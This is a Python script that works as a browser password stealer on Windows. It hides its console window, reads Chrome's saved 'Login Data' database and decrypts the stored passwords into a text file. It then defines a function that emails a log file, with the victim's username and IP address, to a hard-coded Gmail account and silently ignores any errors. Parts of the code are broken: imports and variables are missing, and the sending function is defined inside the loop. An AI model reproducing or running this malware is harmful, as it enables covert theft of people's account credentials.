from os import getenv
import sqlite3
import win32crypt

#Lets hide the console
import win32console, win32gui
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

#lets access the database
conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor()
conn.execute("PRAGMA busy_timeout = 300000")   # Added PRAGMA busy_timneout to wait for some other transaction to finish
cursor.execute('Select action_url, username_value, password_value FROM logins')
fp = open(r"Chromepass.txt", "a+")

# Write to the file
for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
    if password:
        fp.write('\nThe website is '+result[0])
        fp.write('\nThe Username is '+result[1])
        fp.write('\n The password is ' + str(password))

## lets send the file now 
        def sendData(fname, fext):

            attach = "C:\Users\Public\Intel\Logs" + '\\' + fname + fext

            ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
            SERVER = "smtp.gmail.com"
            PORT = 465
            USER = userkey
            PASS = passkey
            FROM = USER
            TO = userkey
            SUBJECT = "Attachment " + "From --> " + curentuser + " Time --> " + str(ts)
            TEXT = "This attachment is sent from python" + '\n\nUSER : ' + curentuser + '\nIP address : ' + ip_address

            message = MIMEMultipart()
            message['From'] = FROM
            message['To'] = TO
            message['Subject'] = SUBJECT
            message.attach(MIMEText(TEXT))

            part = MIMEBase('application', 'octet-stream')
            part.set_payload(open(attach, 'rb').read())
            Encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
            message.attach(part)

            try:
                server = smtplib.SMTP_SSL()
                server.connect(SERVER, PORT)
                server.ehlo()
                server.login(USER, PASS)
                server.sendmail(FROM, TO, message.as_string())
                server.close()
            except Exception as e:
                pass

            return True